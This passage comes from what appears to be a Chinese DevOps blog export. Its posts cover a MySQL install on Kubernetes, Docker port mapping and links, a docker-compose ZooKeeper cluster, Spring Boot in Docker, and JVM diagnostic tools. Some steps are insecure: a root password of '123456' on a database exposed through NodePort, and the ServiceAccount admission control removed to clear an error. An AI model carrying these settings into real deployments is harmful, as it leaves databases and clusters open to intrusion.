复制品；创建可替代的 Pod 当一个 Pod 挂了或者机器挂了的时候。而 Kubernetes API 中负责来重新启动，迁移等行为的部分叫做“replication controller”，它根据一个模板生成了一个 Pod,然后系统就根据用户的需求创建了许多冗余，这些冗余的 Pod 组成了一个整个应用，或者服务，或者服务中的一层。一旦一个 Pod 被创建，系统就会不停的监控 Pod 的健康情况以及 Pod 所在主机的健康情况，如果这个 Pod 因为软件原因挂掉了或者所在的机器挂掉了，replication controller 会自动在一个健康的机器上创建一个一摸一样的 Pod,来维持原来的 Pod 冗余状态不变，一个应用的多个 Pod 可以共享一个机器。 我们经常需要选中一组 Pod，例如，我们要限制一组 Pod 的某些操作，或者查询某组 Pod 的状态，作为 Kubernetes 的基本机制，用户可以给 Kubernetes Api 中的任何对象贴上一组 key:value 的标签，然后，我们就可以通过标签来选择一组相关的 Kubernetes Api 对象，然后去执行一些特定的操作，每个资源额外拥有一组（很多） keys 和 values,然后外部的工具可以使用这些 keys 和 vlues 值进行对象的检索，这些 Map 叫做 annotations（注释）。 Kubernetes 支持一种特殊的网络模型，Kubernetes 创建了一个地址空间，并且不动态的分配端口，它可以允许用户选择任何想使用的端口，为了实现这个功能，它为每个 Pod 分配 IP 地址。 现代互联网应用一般都会包含多层服务构成，比如 web 前台空间与用来存储键值对的内存服务器以及对应的存储服务，为了更好的服务于这样的架构，Kubernetes 提供了服务的抽象，并提供了固定的 IP 地址和 DNS 名称，而这些与一系列 Pod 进行动态关联，这些都通过之前提到的标签进行关联，所以我们可以关联任何我们想关联的 Pod，当一个 Pod 中的容器访问这个地址的时候，这个请求会被转发到本地代理（kube proxy）,每台机器上均有一个本地代理，然后被转发到相应的后端容器。Kubernetes 通过一种轮训机制选择相应的后端容器，这些动态的 Pod 被替换的时候,Kube proxy 时刻追踪着，所以，服务的 IP 地址（dns 名称），从来不变。 所有 Kubernetes 中的资源，比如 Pod,都通过一个叫 URI 的东西来区分，这个 URI 有一个 UID,URI 的重要组成部分是：对象的类型（比如 pod），对象的名字，对象的命名空间，对于特殊的对象类型，在同一个命名空间内，所有的名字都是不同的，在对象只提供名称，不提供命名空间的情况下，这种情况是假定是默认的命名空间。UID 是时间和空间上的唯一。 安装 k8s1234567891011## 安装etcd 和 kubernetes[root@docker ~]# yum install -y etcd kubernetes已加载插件：fastestmirrorDetermining fastest mirrorsepel/x86_64/metalink | 9.0 kB 00:00:00 * base: mirrors.huaweicloud.com * epel: mirror.premi.st * extras: mirrors.163.com * updates: mirrors.163.combase | 3.6 kB 00:00:00docker-ce-nightly | 3.5 kB 00:00:00 安装过程中可已经安装的 docker 冲突,所以先卸载已经安装过的 docker。 12345678910# 查看安装的dockeryum list installed | grep docker# 卸载docker包yum -y remove docker-engine.x86_64# 删除容器、镜像信息rm -rf /var/lib/dockerrm -rf /etc/systemd/system/docker.service.d 再次执行上述命令安装 k8s,直至成功。验证一下，查看 k8s 版本信息: 123[root@mysql mysql]# kubectl versionClient Version: version.Info&#123;Major:\"1\", Minor:\"5\", GitVersion:\"v1.5.2\", GitCommit:\"269f928217957e7126dc87e6adfa82242bfe5b1e\", GitTreeState:\"clean\", BuildDate:\"2017-07-03T15:31:10Z\", GoVersion:\"go1.7.4\", Compiler:\"gc\", Platform:\"linux/amd64\"&#125;Server Version: version.Info&#123;Major:\"1\", Minor:\"5\", GitVersion:\"v1.5.2\", GitCommit:\"269f928217957e7126dc87e6adfa82242bfe5b1e\", GitTreeState:\"clean\", BuildDate:\"2017-07-03T15:31:10Z\", GoVersion:\"go1.7.4\", Compiler:\"gc\", Platform:\"linux/amd64\"&#125; 安装 mysql编写配置描述文件rc 文件1234567891011121314151617181920212223apiVersion: v1kind: ReplicationControllermetadata: name: mysql-rc labels: name: mysql-rcspec: replicas: 1 selector: app: mysql-pod template: metadata: labels: app: mysql-pod spec: containers: - name: mysql image: mysql:8.0.15 ports: - containerPort: 3306 env: - name: MYSQL_ROOT_PASSWORD value: \"123456\" svc 文件12345678910111213141516apiVersion: v1kind: Servicemetadata: name: mysql-svc labels: name: mysql-svcspec: type: NodePort ports: - port: 3306 targetPort: 3306 nodePort: 30306 name: http protocol: TCP selector: name: mysql-pod 创建 rc、service123456789101112131415## 创建[root@mysql mysql]# kubectl create -f mysql-rc.yamlreplicationcontroller \"mysql\" created## 创建service[root@mysql mysql]# kubectl create -f mysql-svc.yamlservice \"mysql-svc\" created# 获取实例[root@mysql mysql]# kubectl get rcNAME DESIRED CURRENT READY AGEmysql 1 0 0 32s# 获取pods[root@mysql mysql]# kubectl get podsNo resources found. vim /etc/kubernetes/apiserver 找到这一行 “KUBE_ADMISSION_CONTROL=”—admission_control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota” ,去掉 ServiceAccount，保存退出。 重新启动 kube-apiserver 服务即可。 123[root@mysql mysql]# kubectl get podsNAME READY STATUS RESTARTS AGEmysql-z3925 0/1 ContainerCreating 0 12s 可见,可正常获取 pod。一直显示为 ContainerCreating 状态，容器创建中。需要下载镜像，等待状态变为 Running 即可。但是等了 20min 还是创建中,查看 pod 的详细信息 12# 查看详细信息 kubectl describe pod mysql-z3925 出现了如下错误信息: 1/etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt 这个文件不存在。 12345678# 下载证书rpm wget http://mirror.centos.org/centos/7/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm# 生成证书rpm2cpio python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm | cpio -iv --to-stdout ./etc/rhsm/ca/redhat-uep.pem | tee /etc/rhsm/ca/redhat-uep.pem## 安装pod-infrastructuredocker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest 删除创建的 rc ,pod 重新创建 1234567# 删除创建RC,servicekubectl delete -f mysql-rc.yamlkubectl delete -f mysql-svc.yaml# 重新创建RCkubectl create -f mysql-rc.yamlkubectl create -f mysql-svc.yaml 过一会可见 pod 处于 Running 状态. 123[root@mysql mysql]# kubectl get podNAME READY STATUS RESTARTS AGEmysql-hh8jw 1/1 Running 0 8m 进入 mysql 修改密码,以便客户端可以正常连接。 1alter user 'root'@'%' identified with mysql_native_password by '123456'; 查看字符集 123456789101112131415mysql&gt; SHOW VARIABLES LIKE '%chara%';+--------------------------+--------------------------------+| Variable_name | Value |+--------------------------+--------------------------------+| character_set_client | latin1 || character_set_connection | latin1 || character_set_database | utf8mb4 || character_set_filesystem | binary || character_set_results | latin1 || character_set_server | utf8mb4 || character_set_system | utf8 || character_sets_dir | /usr/share/mysql-8.0/charsets/ |+--------------------------+--------------------------------+8 rows in set (0.06 sec)mysql&gt; 进入容器,编辑 mysql.cnf 1vi /etc/mysql/conf.d/mysql.cnf 在 mysql 节点下添加一句话,修改默认字符集为 utf8. 1default-character-set = utf8 重启容器即可。 mysql 对外开发的端口为 30306,客户端连接即可,至此 mysql 安装结束。","updated":"2020-07-19T00:23:27.786Z","tags":[{"name":"k8s","slug":"k8s","permalink":"http://xwolf191.github.io/tags/k8s/"}]},{"title":"docker容器时间同步","date":"2019-03-14T09:30:00.000Z","path":"2019/03/14/devops/docker容器时间同步/","text":"通常 docker 容器和宿主机的时间是不同的。有一下三种方式来解决这个问题: 共享主机的localtime创建容器的时候指定启动参数,挂载localtime文件到容器内,保证两者所采用的时区是一致的.(o是只读的意义) 1docker run --name &lt;name&gt; -v /etc/localtime:/etc/localtime:ro .... 复制主机的localtime 1docker cp /etc/localtime containerid:/etc/localtime 软连接 12ln -sf /usr/share/zoneinfo/Asia/Shanghai/etc/localtimeecho \"Asia/Shanghai\" &gt;/etc/timezone","updated":"2020-07-19T00:23:27.783Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"docker端口映射和容器互联","date":"2019-03-10T00:10:00.000Z","path":"2019/03/10/devops/docker端口映射和容器互联/","text":"端口映射在启动容器时，如果不配置宿主机器与虚拟机的端口映射，外部程序是无法访问虚拟机的，因为没有端口，所以需要进行端口映射。 端口映射有两个关键词-P -p，一个是大写一个是小写，通过run —help也可以看到。大写的P是随机映射一个49000-49900的端口到内部容器开放的网络端口。小写p可以指定要映射的端口，并且在一个指定端口上只可以绑定一个容器。 端口映射支持的方式123ip:hostport:containerport #指定ip、指定宿主机port、指定容器portip::containerport www.abc.cn #指定ip、未指定宿主机port（随机）、指定容器porthostport:containerport #未指定ip、指定宿主机port、指定容器port 端口映射方式将容器暴露的所有端口，都随机映射到宿主机上(不推荐)。123456789[root@docker ~]# docker run -P -d --name nginx_1 nginxbed30930c9d7adf0755a8e1de65dd2d4a58b8af36c9f25f96f756efd1960586d[root@docker ~]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESbed30930c9d7 nginx \"nginx -g 'daemon of…\" 8 seconds ago Up 5 seconds 0.0.0.0:32769-&gt;80/tcp nginx_1 # 查看端口映射 [root@docker ~]# docker port bed30930c9d780/tcp -&gt; 0.0.0.0:32769 可见容器将80端口映射到宿主机的32769端口上。 将容器指定端口随机映射到宿主机一个端口上。12[root@docker ~]# docker run -P 80 -d --name nginx_1 nginxbed30930c9d7adf0755a8e1de65dd2d4a58b8af36c9f25f96f756efd1960586d nginx默认只会暴露一个80端口,其他命令内容一致。 将容器指定端口指定映射到宿主机的一个端口上。123456[root@docker zookeeper]# docker run -p 80:80 -d --name nginx_1 nginx119434e3d56df73ee23a0223fb4430bfd08a06d7230263075e2a9a349261f938[root@docker zookeeper]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES119434e3d56d nginx \"nginx -g 'daemon of…\" 8 seconds ago Up 3 seconds 0.0.0.0:80-&gt;80/tcp nginx_1 将容器ip和端口，随机映射到宿主机上。12345[root@docker zookeeper]# docker run -p 192.168.216.150::80 -d --name nginx_1 nginx0d813780941ebb324dcbd456ec746394d5d128f0545e3bb8b3870523df5d7e9f[root@docker zookeeper]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES0d813780941e nginx \"nginx -g 'daemon of…\" 7 seconds ago Up 5 seconds 192.168.216.150:32768-&gt;80/tcp nginx_1 将容器ip和端口，指定映射到宿主机上12345[root@docker zookeeper]# docker run -p 192.168.216.150:80:80 -d --name nginx_1 nginx0d813780941ebb324dcbd456ec746394d5d128f0545e3bb8b3870523df5d7e9f[root@docker zookeeper]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES0d813780941e nginx \"nginx -g 'daemon of…\" 7 seconds ago Up 5 seconds 192.168.216.150:80-&gt;80/tcp nginx_1 容器互联在实际应用中往往需要多个容器交互，比如一个数据库容器来提供db服务，多个应用容器来部署应用，使用端口访问就会暴露端口，这样不太安全。有没有方法让容器互联呢？答案当然是有了。容器互联的方法有多种方式,link，但link是只针对单宿主主机的。 12## 建立nginx到mysql的映射关系[root@docker zookeeper]# docker run -p 80:80 --name mysql_nginx --link mysqldb:mysqldb nginx 123456789101112131415161718192021222324252627## 进入容器[root@docker zookeeper]# docker exec -it cc687823fc24 /bin/bash## 查看环境root@cc687823fc24:/# envMYSQLDB_PORT_3306_TCP_PORT=3306HOSTNAME=cc687823fc24NJS_VERSION=1.15.9.0.2.8-1~stretchMYSQLDB_ENV_MYSQL_VERSION=8.0.15-1debian9NGINX_VERSION=1.15.9-1~stretchMYSQLDB_PORT=tcp://172.17.0.2:3306MYSQLDB_ENV_MYSQL_MAJOR=8.0MYSQLDB_PORT_3306_TCP=tcp://172.17.0.2:3306PWD=/MYSQLDB_ENV_GOSU_VERSION=1.7HOME=/rootMYSQLDB_NAME=/mysql_nginx/mysqldbTERM=xtermMYSQLDB_PORT_33060_TCP=tcp://172.17.0.2:33060MYSQLDB_PORT_3306_TCP_ADDR=172.17.0.2MYSQLDB_ENV_MYSQL_ROOT_PASSWORD=123456MYSQLDB_PORT_3306_TCP_PROTO=tcpMYSQLDB_PORT_33060_TCP_PROTO=tcpSHLVL=1MYSQLDB_PORT_33060_TCP_ADDR=172.17.0.2PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMYSQLDB_PORT_33060_TCP_PORT=33060_=/usr/bin/env telnet 查看端口是可以访问的 1234root@cc687823fc24:/# telnet 172.17.0.2 3306Trying 172.17.0.2...Connected to 172.17.0.2.Escape character is '^]'. 至此，单机的容器互联技术已经OK,集群之间互联下次再说。 参考资料 docker mysql环境配置项 Legacy container links","updated":"2020-07-19T00:23:27.783Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"docker-compose安装zookeeper集群","date":"2019-03-09T04:20:00.000Z","path":"2019/03/09/devops/docker-compose 安装zookeeper集群/","text":"用docker部署服务需要编写dockerfile,如果有多个服务或者集群岂不是很麻烦。所以docker compose应运而生。Docker Compose 可以轻松、高效的管理容器，它是一个用于定义和运行多容器 Docker 的应用程序工具。本节主要的内容: docker-compose 安装 docker-compose文件编写 docker-compose 安装docker-compose 有两种安装方式 下载文件123456789101112# 下载sudo curl -L \"https://github.com/docker/compose/releases/download/1.23.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose# 授权sudo chmod +x /usr/local/bin/docker-compose# 建立软连接sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose# 查看版本信息docker-compose --versiondocker-compose version 1.23.2, build 1110ad01 这种方法由于网络原因经常失败，所有用pip的方式安装。 pip 安装1234567891011# 安装epel扩展yum -y install epel-release# 安装pipyum install pyton-pip# 安装 docker-composepip install docker-compose 查看docker-compose 版本信息，如下表示安装成功 12345[root@localhost zookeeper]# docker-compose versiondocker-compose version 1.23.2, build 1110ad0docker-py version: 3.7.0CPython version: 2.7.5OpenSSL version: OpenSSL 1.0.1e-fips 11 Feb 2013 docker-compose常用命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657[root@docker zookeeper]# COMPOSE_PROJECT_NAME=zk_cluster docker-composeDefine and run multi-container applications with Docker.Usage: docker-compose [-f &lt;arg&gt;...] [options] [COMMAND] [ARGS...] docker-compose -h|--helpOptions: -f, --file FILE Specify an alternate compose file (default: docker-compose.yml) -p, --project-name NAME Specify an alternate project name (default: directory name) --verbose Show more output --log-level LEVEL Set log level (DEBUG, INFO, WARNING, ERROR, CRITICAL) --no-ansi Do not print ANSI control characters -v, --version Print version and exit -H, --host HOST Daemon socket to connect to --tls Use TLS; implied by --tlsverify --tlscacert CA_PATH Trust certs signed only by this CA --tlscert CLIENT_CERT_PATH Path to TLS certificate file --tlskey TLS_KEY_PATH Path to TLS key file --tlsverify Use TLS and verify the remote --skip-hostname-check Don't check the daemon's hostname against the name specified in the client certificate --project-directory PATH Specify an alternate working directory (default: the path of the Compose file) --compatibility If set, Compose will attempt to convert deploy keys in v3 files to their non-Swarm equivalentCommands: build Build or rebuild services bundle Generate a Docker bundle from the Compose file config Validate and view the Compose file create Create services down Stop and remove containers, networks, images, and volumes events Receive real time events from containers exec Execute a command in a running container help Get help on a command images List images kill Kill containers logs View output from containers pause Pause services port Print the public port for a port binding ps List containers pull Pull service images push Push service images restart Restart services rm Remove stopped containers run Run a one-off command scale Set number of containers for a service start Start services stop Stop services top Display the running processes unpause Unpause services up Create and start containers version Show the Docker-Compose version information 此处不做过多说明,主要是启动、停止、重启服务,简单演示一下。 1234567##查看镜像列表[root@docker zookeeper]# COMPOSE_PROJECT_NAME=zk_cluster docker-compose imagesContainer Repository Tag Image Id Size-------------------------------------------------------zk1 zookeeper 3.4.13 06b178591ab3 143 MBzk2 zookeeper 3.4.13 06b178591ab3 143 MBzk3 zookeeper 3.4.13 06b178591ab3 143 MB docker-compose文件编写1234567891011121314151617181920212223242526272829303132333435363738394041424344version: '2'services: zk1: image: zookeeper:3.4.13 restart: always container_name: zk1 volumes: - \"/data:/opt/zookeeper/zk1/data\" - \"/logs:/opt/zookeeper/zk1/logs\" ports: - \"2181:2181\" - \"2881:2888\" - \"2882:2889\" environment: ZOO_MY_ID: 1 ZOO_SERVERS: server.1=zk1:2888:2889 server.2=zk2:2888:2889 server.3=zk3:2888:2889 zk2: image: zookeeper:3.4.13 restart: always container_name: zk2 volumes: - \"/data:/opt/zookeeper/zk2/data\" - \"/logs:/opt/zookeeper/zk2/logs\" ports: - \"2182:2181\" - \"2883:2888\" - \"2884:2889\" environment: ZOO_MY_ID: 2 ZOO_SERVERS: server.1=zk1:2888:2889 server.2=zk2:2888:2889 server.3=zk3:2888:2889 zk3: image: zookeeper:3.4.13 restart: always container_name: zk3 volumes: - \"/data:/opt/zookeeper/zk3/data\" - \"/logs:/opt/zookeeper/zk3/logs\" ports: - \"2183:2181\" - \"2885:2888\" - \"2886:2889\" environment: ZOO_MY_ID: 3 ZOO_SERVERS: server.1=zk1:2888:2889 server.2=zk2:2888:2889 server.3=zk3:2888:2889 后台启动 1234567891011121314151617181920212223242526272829303132[root@docker zookeeper]# COMPOSE_PROJECT_NAME=zk_cluster docker-compose up -dPulling zk1 (zookeeper:3.4.13)...3.4.13: Pulling from library/zookeeper6c40cc604d8e: Pull completee78b80385239: Pull completef41fe1b6eee3: Pull complete365a20fafc58: Pull complete9e606d67ebbc: Pull complete36ef678bdfcf: Pull complete19d9db30b445: Pull completePulling zk2 (zookeeper:3.4.13)...3.4.13: Pulling from library/zookeeperCreating zk1 ... doneCreating zk2 ... doneCreating zk3 ... done``` 查看运行状态:```bash[root@docker zookeeper]# COMPOSE_PROJECT_NAME=zk_cluster docker-compose psName Command State Ports----------------------------------------------------------------------------------------zk1 /docker-entrypoint.sh zkSe ... Up 0.0.0.0:2181-&gt;2181/tcp, 0.0.0.0:2881-&gt;2888/tcp, 0.0.0.0:2882-&gt;2889/tcp, 3888/tcpzk2 /docker-entrypoint.sh zkSe ... Up 0.0.0.0:2182-&gt;2181/tcp, 0.0.0.0:2883-&gt;2888/tcp, 0.0.0.0:2884-&gt;2889/tcp, 3888/tcpzk3 /docker-entrypoint.sh zkSe ... Up 0.0.0.0:2183-&gt;2181/tcp, 0.0.0.0:2885-&gt;2888/tcp, 0.0.0.0:2886-&gt;2889/tcp, 3888/tcp 查看zk状态:1234567891011121314[root@docker zookeeper]# docker exec -it 7b2a7e84dfcb /bin/bashbash-4.4# lsLICENSE.txt contrib srcNOTICE.txt dist-maven zookeeper-3.4.13.jarREADME.md docs zookeeper-3.4.13.jar.ascREADME_packaging.txt ivy.xml zookeeper-3.4.13.jar.md5bin ivysettings.xml zookeeper-3.4.13.jar.sha1build.xml libconf recipesbash-4.4# cd bin/bash-4.4# zkServer.sh statusZooKeeper JMX enabled by defaultUsing config: /conf/zoo.cfgMode: leader 看到节点状态显示为leader，zk 集群已经搭建ok。 参考资料 zoookeeper docker配置项参考","updated":"2020-07-19T00:23:27.774Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"docker仓库","date":"2019-03-08T09:35:00.000Z","path":"2019/03/08/devops/docker仓库/","text":"","updated":"2020-07-19T00:23:27.774Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"docker部署spring boot项目","date":"2019-03-06T07:00:00.000Z","path":"2019/03/06/devops/docker部署spring boot项目/","text":"docker容器启动速度快，占用内存低，迁移方便。在云计算时代大放异彩。 前提 docker安装完毕 JDK maven配置ok git(如果代码在远程仓库) 构建spring boot项目IDEA 创建一个简单的spring boot项目,此处主要关注maven和Dockerfile的配置 pom.xml 1234567891011121314151617181920&lt;!--docker plugin--&gt; &lt;plugin&gt; &lt;groupId&gt;com.spotify&lt;/groupId&gt; &lt;artifactId&gt;docker-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt; &lt;configuration&gt; &lt;!--镜像的名称--&gt; &lt;repository&gt;$&#123;docker.image.prefix&#125;/$&#123;project.artifactId&#125;&lt;/repository&gt; &lt;imageName&gt;$&#123;project.artifactId&#125;&lt;/imageName&gt; &lt;!--Dockerfile所在目录--&gt; &lt;dockerDirectory&gt;.&lt;/dockerDirectory&gt; &lt;resources&gt; &lt;resource&gt; &lt;targetPath&gt;/&lt;/targetPath&gt; &lt;directory&gt;$&#123;project.build.directory&#125;&lt;/directory&gt; &lt;include&gt;$&#123;project.build.finalName&#125;.jar&lt;/include&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/configuration&gt; &lt;/plugin&gt; Dockerfile 1234567891011121314151617181920212223FROM java:8MAINTAINER xwolf &lt;1232@qq.com&gt;EXPOSE 9090ENV MIN_HEAP 512mENV MAX_HEAP 2048mRUN mkdir /opt/data/jarsWORKDIR /opt/data/jarsRUN mkdir /opt/logs/msVOLUME /opt/logs/msENV MODULE msENV MODULE_VERSION 0.0.1-SNAPSHOTADD ./$&#123;MODULE&#125;-$&#123;MODULE_VERSION&#125;.jar /opt/dataCMD java -jar -Xms$&#123;MIN_HEAP&#125; -Xmx$&#123;MAX_HEAP&#125; \\ $&#123;MODULE&#125;-$&#123;MODULE_VERSION&#125;.jar \\ &gt; /opt/logs/$&#123;MODULE&#125;-`date +%m%d%H%M`.log 2&gt; /opt/logs/$&#123;MODULE&#125;-error-`date +%m%d%H%M`.log 简单的controller 1234567891011121314151617/** * @author xwolf */@RestControllerpublic class HelloController &#123; /** * 测试hello world * @return */ @GetMapping(\"/hello\") public String hello()&#123; return \"Hello Docker\"; &#125;&#125; 保证项目可以正常启动即可(不能正常启动也可以^_^)。 将代码拉下来执行mvn命令,打包并创建镜像。 1root@docker]# mvn package docker:build 如果执行成功,查看docker镜像即可看到创建成功的镜像。 123[root@docker ms]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZExwolf/ms latest 1f46538fb6e6 17 minutes ago 661MB 运行docker image 123[root@docker ms]# docker run -p 9090:9090 -t xwolf/msdocker: Error response from daemon: driver failed programming external connectivity on endpoint stupefied_heisenberg (4717abc21b53d821163cf04c723c95a7a0c82a6faaa540fe7554053c2ed43bca): (iptables failed: iptables --wait -t nat -A DOCKER -p tcp -d 0/0 --dport 9090 -j DNAT --to-destination 172.17.0.2:9090 ! -i docker0: iptables: No chain/target/match by that name. (exit status 1)). 抛出了一个异常,但是docker container是创建成功的。 咱们的防火墙是关闭的。启动防火墙，重新启动docker container 1234567891011# 启动防火墙[root@docker ms]# systemctl start firewalld.service[root@docker ms]# docker ps -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESd6901f34d5b8 xwolf/ms \"/bin/sh -c 'java -j…\" 9 minutes ago Created vigorous_ishizakaffff9fdbe1f2 consul \"docker-entrypoint.s…\" 2 months ago Exited (1) 2 months ago node1c3a9f6d71ad2 rabbitmq:management \"docker-entrypoint.s…\" 2 months ago Exited (0) 30 hours ago rabbitmq# 启动容器 [root@docker ms]# docker start d6901f34d5b8d6901f34d5b8 访问一下地址,正常就可以看到返回值。 1234[root@docker ms]# curl http://localhost:9090&#123;\"timestamp\":\"2019-03-06T15:29:18.134+0000\",\"status\":404,\"error\":\"Not Found\",\"message\":\"No message available\",\"path\":\"/\"&#125;[root@docker ms]# curl http://localhost:9090/helloHello Docker 进入到容器，即可看到jar存放的位置，日志等自己查看吧。 123456[root@docker ms]# docker exec -it d6901f34d5b8 /bin/bashroot@d6901f34d5b8:/opt/data#root@d6901f34d5b8:/opt/data#root@d6901f34d5b8:/opt/data# lsms-0.0.1-SNAPSHOT.jar 至此,docker 部署spring boot的过程搞完了。","updated":"2020-07-19T00:23:27.784Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"JVM故障诊断和性能调优","date":"2019-03-01T08:00:00.000Z","path":"2019/03/01/java/jvm/JVM故障诊断和性能调优/","text":"jdk 安装的时候内置了很多命令工具,如下图所示 jmapjmap 主要是输出 jvm 的内存分配信息。 1234567891011121314151617181920212223242526272829[root@localhost ~]# jmapUsage: jmap [option] &lt;pid&gt; (to connect to running process) jmap [option] &lt;executable &lt;core&gt; (to connect to a core file) jmap [option] [server_id@]&lt;remote server IP or hostname&gt; (to connect to remote debug server)where &lt;option&gt; is one of: &lt;none&gt; to print same info as Solaris pmap -heap to print java heap summary -histo[:live] to print histogram of java object heap; if the \"live\" suboption is specified, only count live objects -clstats to print class loader statistics -finalizerinfo to print information on objects awaiting finalization -dump:&lt;dump-options&gt; to dump java heap in hprof binary format dump-options: live dump only live objects; if not specified, all objects in the heap are dumped. format=b binary format file=&lt;file&gt; dump heap to &lt;file&gt; Example: jmap -dump:live,format=b,file=heap.bin &lt;pid&gt; -F force. Use with -dump:&lt;dump-options&gt; &lt;pid&gt; or -histo to force a heap dump or histogram when &lt;pid&gt; does not respond. The \"live\" suboption is not supported in this mode. -h | -help to print this help message -J&lt;flag&gt; to pass &lt;flag&gt; directly to the runtime system 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[root@localhost ~]# jmap -heap 912Attaching to process ID 912, please wait...Debugger attached successfully.Server compiler detected.JVM version is 25.171-b11using thread-local object allocation.Mark Sweep Compact GCHeap Configuration: MinHeapFreeRatio = 40 MaxHeapFreeRatio = 70 MaxHeapSize = 1073741824 (1024.0MB) NewSize = 178913280 (170.625MB) MaxNewSize = 357892096 (341.3125MB) OldSize = 357957632 (341.375MB) NewRatio = 2 SurvivorRatio = 8 MetaspaceSize = 21807104 (20.796875MB) CompressedClassSpaceSize = 1073741824 (1024.0MB) MaxMetaspaceSize = 17592186044415 MB G1HeapRegionSize = 0 (0.0MB)Heap Usage:New Generation (Eden + 1 Survivor Space): capacity = 161153024 (153.6875MB) used = 2965600 (2.828216552734375MB) free = 158187424 (150.85928344726562MB) 1.8402385052358683% usedEden Space: capacity = 143261696 (136.625MB) used = 2869664 (2.736724853515625MB) free = 140392032 (133.88827514648438MB) 2.003092299005032% usedFrom Space: capacity = 17891328 (17.0625MB) used = 95936 (0.09149169921875MB) free = 17795392 (16.97100830078125MB) 0.536215086996337% usedTo Space: capacity = 17891328 (17.0625MB) used = 0 (0.0MB) free = 17891328 (17.0625MB) 0.0% usedtenured generation: capacity = 357957632 (341.375MB) used = 65830848 (62.78118896484375MB) free = 292126784 (278.59381103515625MB) 18.39068149830648% used34389 interned Strings occupying 4043536 bytes. 可以看到新生代、老年代、from、to 区域内存大小,使用比例等信息。 jmap 生成堆栈文件,可以用 jvisualvm,MAT 来查看。 123[root@localhost opt]# jmap -dump:format=b,file=/opt/tyty.dmp 912Dumping heap to /opt/tyty.dmp ...Heap dump file created jmap -histo:live 打印存活对象的堆信息 123456789101112131415161718192021222324252627[root@localhost ~]# jmap -histo:live 4803|more num #instances #bytes class name---------------------------------------------- 1: 241408 19711856 [C 2: 6376 6575832 [B 3: 239513 5748312 java.lang.String 4: 60783 5348904 java.lang.reflect.Method 5: 46181 3325032 com.platform.entity.SysRegionEntity 6: 88804 2841728 java.util.concurrent.ConcurrentHashMap$Node 7: 139099 2225584 java.lang.Integer 8: 6272 1746832 [I 9: 26527 1658824 [Ljava.lang.Object; 10: 13734 1571192 java.lang.Class 11: 33734 1349360 java.util.LinkedHashMap$Entry 12: 36504 1168128 java.util.HashMap$Node 13: 14199 1065040 [Ljava.util.HashMap$Node; 14: 17774 995344 java.util.LinkedHashMap 15: 768 834944 [Ljava.util.concurrent.ConcurrentHashMap$Node; 16: 22656 724992 java.lang.ref.WeakReference 17: 30572 674312 [Ljava.lang.Class; 18: 12764 612672 org.aspectj.weaver.reflect.ShadowMatchImpl 19: 24666 591984 java.util.ArrayList 20: 21486 515664 org.springframework.core.MethodClassKey 21: 14789 455880 [Ljava.lang.String; 22: 12764 408448 org.aspectj.weaver.patterns.ExposedState--More-- class name 是对象类型，说明如下： B byte C char D double F float I int J long Z boolean [ 数组，如[I 表示 int[]L+类名 其他对象 jhatjhat 分析 jmap 生成的堆栈文件 12345678910[root@localhost opt]# jhat tyty.dmpReading from tyty.dmp...Dump file created Wed Feb 27 16:45:13 CST 2019Snapshot read, resolving...Resolving 2250009 objects...Chasing references, expect 450 dots..................................................................................................................................................................................................................................................................................................................................................................................................................................................................Eliminating duplicate references..................................................................................................................................................................................................................................................................................................................................................................................................................................................................Snapshot resolved.Started HTTP server on port 7000Server is ready. 浏览器访问 IP:7000 即可看到类的信息. 随意点击一个 class点击对应的 class 即可看到该页面主要包含了该类的父类、子类信息、类加载器、GC ROOT 引用链信息和从当前对象开始所有可达的对象信息。 主要看下面几个入口信息 All classes including platform查看所有类的信息 Show all members of the rootsetGC roots 下的所有引用的 class 信息 Show instance counts for all classes (including platform)所有的实例对象信息,某一个对象创建的个数和占用的空间.(包含 JDK 的类信息) Show instance counts for all classes (excluding platform)所有的实例对象信息,某一个对象创建的个数和占用的空间.(不包含 JDK 的类信息) Show heap histogramShow finalizer summaryGC 回收的信息 Execute Object Query Language (OQL) query对象查询语言,可以获取对象的一些信息。不过多介绍，具体参考文章末尾的参考资料信息。 jstackjstack 主要是输出 jvm 的栈信息。 12345678910111213141516[root@localhost ~]# jstackUsage: jstack [-l] &lt;pid&gt; (to connect to running process) jstack -F [-m] [-l] &lt;pid&gt; (to connect to a hung process) jstack [-m] [-l] &lt;executable&gt; &lt;core&gt; (to connect to a core file) jstack [-m] [-l] [server_id@]&lt;remote server IP or hostname&gt; (to connect to a remote debug server)Options: -F to force a thread dump. Use when jstack &lt;pid&gt; does not respond (process is hung) -m to print both java and native frames (mixed mode) -l long listing. Prints additional information about locks -h or -help to print this help message 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798[root@localhost ~]# jstack 9122019-02-27 15:18:38Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.171-b11 mixed mode):\"Attach Listener\" #89 daemon prio=9 os_prio=0 